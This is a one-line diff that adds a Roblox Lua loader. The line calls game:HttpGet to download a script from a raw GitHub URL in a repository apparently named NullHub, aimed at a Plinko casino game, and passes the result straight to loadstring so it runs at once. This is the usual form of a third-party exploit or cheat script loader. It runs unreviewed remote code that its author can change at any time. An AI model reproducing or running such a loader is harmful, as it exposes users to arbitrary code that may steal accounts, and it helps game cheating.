@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ImInsane1337/NullHub/plinkocasino/plinko.lua"))()
